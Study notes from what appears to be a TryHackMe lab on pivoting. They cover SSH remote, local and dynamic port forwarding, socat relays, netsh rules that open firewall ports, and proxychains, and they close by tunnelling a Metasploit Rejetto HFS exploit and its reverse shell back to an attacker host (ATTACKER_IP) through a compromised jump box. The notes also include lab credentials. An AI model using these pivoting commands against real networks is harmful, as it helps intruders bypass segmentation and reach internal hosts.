<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Port Forwarding</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Port Forwarding</h1><br/><p><strong><h1>Port Forwarding</h1></strong></p><p></p><p>Most of the lateral movement techniques we have presented require specific ports to be available for an attacker. In real-world networks, the administrators may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing you from reaching SMB, RDP, WinRM or RPC ports.</p><p></p><p>To go around these restrictions, we can use port forwarding techniques, which consist of using any compromised host as a jump box to pivot to other hosts. It is expected that some machines will have more network permissions than others, as every role in a business will have different needs in terms of what network services are required for day-to-day work.</p><p></p><p><strong><h3>A) SSH Tunnelling</h3></strong></p><p></p><p>The first protocol we&#39;ll be looking at is SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system.</p><p></p><p>SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we&#39;ll use depending on the situation. To explain each case, let&#39;s assume a scenario where we&#39;ve gained control over the PC-1 machine (it doesn&#39;t need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can&#39;t directly connect. We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker&#39;s PC, which will act as an SSH server. The reason to do so is that you&#39;ll often find an SSH client on Windows machines, but no SSH server will be available most of the time.</p><p></p><p><img src="images/341-1.png" alt="images/341-1.png" /></p><p></p><p>Since we&#39;ll be making a connection back to our attacker&#39;s machine, we&#39;ll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:</p><p></p><p><strong>useradd tunneluser -m -d /home/tunneluser -s /bin/true</strong></p><p><strong>passwd tunneluser</strong></p><p></p><p>Depending on your needs, the SSH tunnel can be used to do either local or remote port forwarding. Let&#39;s take a look at each case.</p><p></p><p><strong><span style="text-decoration:underline;">I) SSH Remote Port Forwarding</span></strong></p><p></p><p>In our example, let&#39;s assume that firewall policies block the attacker&#39;s machine from directly accessing port 3389 on the server. If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. Remote port forwarding allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a remote SSH server (the attacker&#39;s machine).</p><p></p><p>As a result, a port will be opened in the attacker&#39;s machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:</p><p></p><p><img src="images/341-2.png" alt="images/341-2.png" /></p><p></p><p>A valid question that might pop up by this point is why we need port forwarding if we have compromised PC-1 and can run an RDP session directly from there. The answer is simple: in a situation where we only have console access to PC-1, we won&#39;t be able to use any RDP client as we don&#39;t have a GUI. By making the port available to your attacker&#39;s machine, you can use a Linux RDP client to connect. Similar situations arise when you want to run an exploit against a port that can&#39;t be reached directly, as your exploit may require a specific scripting language that may not always be available at machines you compromise along the way.</p><p></p><p>Referring to the previous image, to forward port 3389 on the server back to our attacker&#39;s machine, we can use the following <strong>command</strong> on PC-1:</p><p></p><p><strong>ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N</strong></p><p></p><p>This will establish an SSH session from <strong>PC-1</strong> to 1.1.1.1 (<strong>Attacker PC</strong>) using the <strong>tunneluser</strong> user.</p><p></p><p>Since the tunneluser isn&#39;t allowed to run a shell on the Attacker PC, we need to run the ssh command with the <strong>-N </strong>switch to prevent the client from requesting one, or the connection will exit immediately. The <strong>-R</strong> switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the SSH server (<strong>3389</strong>), followed by a colon and then the IP and port of the socket we&#39;ll be forwarding (<strong>3.3.3.3:3389</strong>). <strong>Notice</strong> that the <strong>port numbers don&#39;t need to match</strong>, although they do in this example.</p><p></p><p>The command itself won&#39;t output anything, but the tunnel will depend on the command to be running. Whenever we want, we can close the tunnel by pressing CTRL+C as with any other command.</p><p></p><p>Once our tunnel is set and running, we can go to the attacker&#39;s machine and RDP into the forwarded port to reach the server:</p><p></p><p><strong>xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword</strong></p><p></p><p></p><p><strong><span style="text-decoration:underline;">II) SSH Local Port Forwarding</span></strong></p><p></p><p>Local port forwarding allows us to &quot;pull&quot; a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker&#39;s machine and make it available through a port on PC-1. That way, any host that can&#39;t connect directly to the attacker&#39;s PC but can connect to PC-1 will now be able to reach the attacker&#39;s services through the pivot host.</p><p></p><p>Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn&#39;t be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.</p><p></p><p><img src="images/341-3.png" alt="images/341-3.png" /></p><p></p><p>To forward port 80 from the attacker&#39;s machine and make it available from PC-1, we can run the following <strong>command</strong> on PC-1:</p><p></p><p><strong>ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N</strong></p><p></p><p>The command structure is similar to the one used in remote port forwarding but uses the <strong>-L</strong> option for local port forwarding. This option requires us to indicate the local socket used by PC-1 to receive connections (<strong>*:80</strong>) and the remote socket to connect to from the attacker&#39;s PC perspective (<strong>127.0.0.1:80</strong>).</p><p></p><p>Notice that we use the IP address 127.0.0.1 in the second socket, as from the attacker&#39;s PC perspective, that&#39;s the host that holds the port 80 to be forwarded.</p><p></p><p>Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with dir=in). Administrative privileges are needed for this:</p><p></p><p><strong>netsh advfirewall firewall add rule name=&quot;Open Port 80&quot; dir=in action=allow protocol=TCP localport=80</strong></p><p></p><p>Once your tunnel is set up, any user pointing their browsers to <strong>PC-1</strong> at <strong>http://2.2.2.2:80</strong> and see the website published by the <strong>attacker&#39;s machine</strong>.</p><p></p><p></p><p></p><p><strong><h2>B) Port Forwarding With socat</h2></strong></p><p></p><p>In situations where SSH is not available, socat can be used to perform similar functionality. While not as flexible as SSH, socat allows you to forward ports in a much simpler way. One of the disadvantages of using socat is that we need to transfer it to the pivot host (PC-1 in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.</p><p></p><p>The basic syntax to perform port forwarding using socat is much simpler. If we wanted to open port 1234 on a host and forward any connection we receive there to port 4321 on host 1.1.1.1, you would have the following <strong>command</strong>:</p><p></p><p><strong>socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321</strong></p><p></p><p><strong>Note:</strong> We can also add the <strong>reuseaddr</strong> option after fork. (It helps in automatic server restarts)</p><p>The <strong>fork</strong> option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing. If you don&#39;t include it, socat will close when the first connection made is finished.</p><p></p><p>Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following <strong>command</strong>:</p><p></p><p><strong>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389</strong></p><p></p><p><strong>Note </strong>that socat can&#39;t forward the connection directly to the attacker&#39;s machine as SSH did but will open a port on PC-1 that the attacker&#39;s machine can then connect to:</p><p></p><p><img src="images/341-4.png" alt="images/341-4.png" /></p><p></p><p>As usual, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:</p><p></p><p><strong>netsh advfirewall firewall add rule name=&quot;Open Port 3389&quot; dir=in action=allow protocol=TCP localport=3389</strong></p><p></p><p>If, on the other hand, we&#39;d like to expose port 80 from the attacker&#39;s machine so that it is reachable by the server, we only need to adjust the <strong>command</strong> a bit:</p><p></p><p><strong>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80</strong></p><p></p><p>As a result, PC-1 will spawn port 80 and listen for connections to be forwarded to port 80 on the attacker&#39;s machine:</p><p></p><p><img src="images/341-5.png" alt="images/341-5.png" /></p><p></p><p></p><p></p><p><strong><h2>C) Dynamic Port Forwarding and SOCKS</h2></strong></p><p></p><p>While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, dynamic port forwarding allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a SOCKS proxy.</p><p></p><p>Since we don&#39;t want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following <strong>command</strong>:</p><p></p><p><strong>ssh tunneluser@1.1.1.1 -R 9050 -N</strong></p><p></p><p>In this case, the SSH server will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.</p><p></p><p>The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using proxychains. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at<strong> /etc/proxychains.conf</strong> on your AttackBox. If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for socks proxying:</p><p></p><p><strong>[ProxyList]</strong></p><p><strong>socks4  127.0.0.1 9050</strong></p><p></p><p>The default port is <strong>9050</strong>, but any port will work as long as it matches the one we used when establishing the SSH tunnel.</p><p></p><p>If we now want to execute any command through the proxy, we can use proxychains:</p><p></p><p><strong>proxychains curl http://pxeboot.za.tryhackme.com</strong></p><p></p><p><strong>Note</strong> that some software like nmap might not work well with SOCKS in some circumstances, and might show altered results, so your mileage might vary.</p><p></p><p></p><p><strong><h3>Practical Room Task</h3></strong></p><p></p><p>We will be given SSH credential of THMJMP2 machine. (Acts as already compromised Host)</p><p>The THMIIS Server is only accessible from the THMJMP2 machine. (Not from our attacker machine)</p><p></p><p>Thus, we will use Port forwarding to access RDP on THMIIS Server.</p><p></p><p>Our first objective will be to connect via RDP to THMIIS. If we try to connect directly from our attacker machine, we will find that port 3389 has been filtered via a firewall and is therefore not available directly. However, the port is up and running but can only be accessed from THMJMP2. By using socat, which is available on <strong>C:\tools\socat\</strong> on THMJMP2, we will forward the RDP port to make it available on THMJMP2 to connect from our attacker&#39;s machine.</p><p></p><p>To do so, we will run socat with the following parameters:</p><p></p><p><strong>socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389</strong></p><p></p><p><strong>Note </strong>that we can&#39;t use port 3389 for our listener since it is already being used in THMJMP2 for its own RDP service. Feel free to change the listener port (13389) to a different number to avoid clashing with other students. In a typical setup, you&#39;d have to add a firewall rule to allow traffic through the listener port, but THMJMP2 has its firewall disabled for your convenience.</p><p></p><p>Once the listener has been set up, you should be able to connect to THMIIS via RDP from your attacker machine by pivoting through your socat listener at THMJMP2:</p><p></p><p><strong>xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020</strong></p><p></p><p></p><p><strong><h2>Tunnelling Complex Exploits</h2></strong></p><p></p><p>he THMDC server is running a vulnerable version of Rejetto HFS. The problem we face is that firewall rules restrict access to the vulnerable port so that it can only be viewed from THMJMP2. Furthermore, outbound connections from THMDC are only allowed machines in its local network, making it impossible to receive a reverse shell directly to our attacker&#39;s machine. To make things worse, the Rejetto HFS exploit requires the attacker to host an HTTP server to trigger the final payload, but since no outbound connections are allowed to the attacker&#39;s machine, we would need to find a way to host a web server in one of the other machines in the same network, which is not at all convenient. We can use port forwarding to overcome all of these problems.</p><p></p><p>First, let&#39;s take a look at how the exploit works. First, it will connect to the HFS port (<strong>RPORT in Metasploit</strong>) to trigger a second connection. This second connection will be made against the attacker&#39;s machine on <strong>SRVPORT</strong>, where a web server will deliver the final payload. Finally, the attacker&#39;s payload will execute and send back a reverse shell to the attacker on <strong>LPORT</strong>:</p><p></p><p><img src="images/341-6.png" alt="images/341-6.png" /></p><p></p><p>With this in mind, we could use SSH to forward some ports from the attacker&#39;s machine to THMJMP2 (SRVPORT for the web server and LPORT to receive the reverse shell) and pivot through THMJMP2 to reach RPORT on THMDC. We would need to do three port forwards in both directions so that all the exploit&#39;s interactions can be proxied through THMJMP2:</p><p></p><p><img src="images/341-7.png" alt="images/341-7.png" /></p><p></p><p>Red (1) : Remote Tunnel</p><p>Green (2) : Local Tunnel</p><p></p><p><strong>Rejetto HFS</strong> will be listening on port 80 on THMDC, so we need to tunnel that port back to our attacker&#39;s machine through <strong>THMJMP2</strong> using remote port forwarding. Since the attackbox has port 80 occupied with another service, we will need to link <strong>port 80</strong> on <strong>THMDC</strong> with some port not currently in use by the attackbox. Let&#39;s use port <strong>8888</strong>. When running ssh in <strong>THMJMP2</strong> to forward this port, we would have to add <strong>-R 8888:thmdc.za.tryhackme.com:80</strong> to our command.</p><p></p><p>For SRVPORT and LPORT, let&#39;s choose two random ports at will. For demonstrative purposes, we&#39;ll set <strong>SRVPORT=6666</strong> and <strong>LPORT=7777</strong>, but be sure to use different ports as the lab is shared with other students, so if two of you choose the same ports, when trying to forward them, you&#39;ll get an error stating that such port is already in use on THMJMP2.</p><p></p><p>To forward such ports from our attacker machine to THMJMP2, we will use local port forwarding by adding <strong>-L *:6666:127.0.0.1:6666</strong> and <strong>-L *:7777:127.0.0.1:7777</strong> to our ssh command. This will bind both ports on THMJMP2 and tunnel any connection back to our attacker machine.</p><p></p><p>Putting the whole <strong>command</strong> together, we would end up with the following:</p><p></p><p><strong>ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N</strong></p><p></p><p>Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:</p><p></p><p><img src="images/341-8.png" alt="images/341-8.png" /></p><p></p><p>There is a lot to unpack here:</p><p></p><p>    ▪ The <strong>LHOST</strong> parameter usually serves two purposes: it is used as the IP where a listener is bound on the attacker&#39;s machine to receive a reverse shell; it is also embedded on the payload so that the victim knows where to connect back when the exploit is triggered. In our specific scenario, since THMDC won&#39;t be able to reach us, we need to force the payload to connect back to THMJMP2, but we need the listener to bind to the attacker&#39;s machine on <strong>127.0.0.1</strong>. To this end, <strong>Metasploit</strong> provides an <strong>optional </strong>parameter <strong>ReverseListenerBindAddress</strong>, which can be used to specify the listener&#39;s bind address on the attacker&#39;s machine separately from the address where the payload will connect back. In our example, we want the reverse shell listener to be bound to 127.0.0.1 on the attacker&#39;s machine and the payload to connect back to THMJMP2 (as it will be forwarded to the attacker machine through the SSH tunnel).</p><p>    ▪ Our exploit must also run a web server to host and send the final payload back to the victim server. We use SRVHOST to indicate the listening address, which in this case is 127.0.0.1, so that the attacker machine binds the webserver to localhost. While this might be counterintuitive, as no external host would be able to point to the attacker&#39;s machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at SRVPORT back to the attacker&#39;s machine.</p><p>    ▪ The RHOSTS is set to point to 127.0.0.1 as the SSH tunnel will forward the requests to THMDC through the SSH tunnel established with THMJMP2. RPORT is set to 8888, as any connection sent to that port on the attacker machine will be forwarded to port 80 on THMDC.</p><p></p><p>After launching the exploit, you will receive a shell back at the attacker&#39;s machine.</p></div>
</body>
</html>
